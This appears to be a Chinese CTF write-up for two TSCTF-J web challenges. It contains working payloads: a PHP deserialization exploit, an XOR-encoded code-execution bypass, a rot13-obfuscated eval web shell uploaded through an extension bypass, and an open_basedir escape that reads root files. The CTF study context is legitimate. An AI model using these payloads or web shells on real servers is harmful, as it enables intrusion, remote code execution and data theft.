# TSCTF-J

* ## Web方向

### 0x01 easyWEB

打开页面发现就是一个输入框，输入了几次都是error

查看源代码发现一个叫`submit.js`的文件，内部有一个叫做BubbleGVM的函数，初步推测与检测输入有关

进入`submit.js`查看源代码，发现了一段代码

![](/assets/import.png)

用python脚本翻译一下十六进制代码，得到

![](/assets/import1.png)

发现一个目录叫`/fllllaiig`，进去看看

![](/assets/import2.png)

整理代码思路：

通过get方法传入已经序列化的参数，当参数为常规可反序列化对象时进行反序列化，传入`protected`类型变量`op`，`filename`，`content`和`passwd`，其中`passwd`值需要经过验证，在传入`pop`参数后在析构函数中调用`process`函数进行反序列化以及验证`passwd`操作

发现两个点：

第一个点

![](/assets/import4.png)

加盐md5，已知盐值，而且提示`passwd`都是数字，则尝试用脚本跑出来

```
import hashlib

def md5sum(s):
    m = hashlib.md5()  #创建一个hashlib.md5()对象
    m.update(s.encode("utf8"))    #将参数转换为UTF8编码
    return m.hexdigest()             #用十六进制输出加密后的数据

salt = md5sum('Bubb1EgVm')
data = open("C:\CTF\TSCTF-J\EasyWeb\Rainbow.txt",'w+')
for i in range(10000000):
    a = md5sum(str(i))
    b = a + salt
    print(str(i) + " : " + md5sum(b),file=data)
data.close()
```

之后在文件中搜索发现最后的密码为`5201314`

![](/assets/import7.png)

第二个点：

![](/assets/import8.png)

析构函数中`op==='2'`为强对比，而前面验证函数中`op=='2'`为弱对比，因而可以通过`op=2`来绕过强对比，避免op被置为'1'从而跳入put分支

第三个点：

变量类型为`protected`，在之后构造payload时需要对payload进行手动修改

构造payload：

```
<?php

class FileHandler {

    public $op = 2;
    public $filename = "hint.php";
    public $content = "111";
    public $passwd = '5201314';    
}
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
$exp = new FileHandler();
$exp_s = serialize($exp);
var_dump(is_valid($exp_s));
echo($exp_s);
?>
```

远程`file_get_contents(file)`需要用绝对地址

![](/assets/import9.png)

在构造protected变量的序列化过程中存在\00字符，表现为不可见字符，需要手动添加，位置为环绕\*字符左右各一个，同时s要大写表示后面允许使用\00的表达

最终payload:

```
O:11:"FileHandler":4:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:32:"/var/www/html/fllllaiig/hint.php";S:10:"\00*\00content";S:3:"111";S:9:"\00*\00passwd";S:7:"5201314";}
```

发现result并无返回值，查看页面源代码发现hint：

```
$dir='bubblegvm5201314';
```

进入到`/bubblegvm5201314`目录下查看

![](/assets/import10.png)

发现是正则表达式检测，通过异或绕过

Payload：

```
?a=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

跳转到phpinfo界面，在disable\_function处发现flag：

![](/assets/import11.png)



### 0x02 EzUpload

传一个一句话上去，发现过滤.php类型的文件，老规矩传一个jpg上去发现成功了

![](/assets/import12.png)

上传图片马发现有过滤关键字，尝试多次发现过滤`eval`关键字

将`eval`进行rot13加密绕过检测并且在代码段进行解密，成功绕过检测

Payload：

```
<?php 
$exp = $_POST['shell'];
@preg_replace('/ad/e','@'.str_rot13('riny').'($exp)', 'add');
?>
```

用burpSuite抓包更改文件后缀从jpg改成php绕过检测

![](/assets/import13.png)

![](/assets/import14.png)

用中国蚁剑连接并找到了两个假flag

所有的地方都找不到flag，怀疑flag在根目录可是我们并没有权限访问

上传一个phpinfo.php查看一下phpinfo

发现了溢出屏幕的`disabled_functions`

![](/assets/import15.png)

和只有/var、/usr和/tmp的`open_basedir`

![](/assets/import16.png)

这里可以通过上传php文件然后利用`chdir(‘..’)`指令前往前面目录让目前目录变为根目录最后使用`var_dump(scandir(‘/’)`\)获取目前目录所有文件

Payload：

```
<?php
mkdir('1');
chdir('1');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');
var_dump(scandir('/'));
?>
```

发现`flag.txt`

![](/assets/import17.png)

然后将`var_dump(scandir(‘/’)`换成`get_file_contents(‘/flag.txt’)`就可以获取flag了

![](/assets/import18.png)

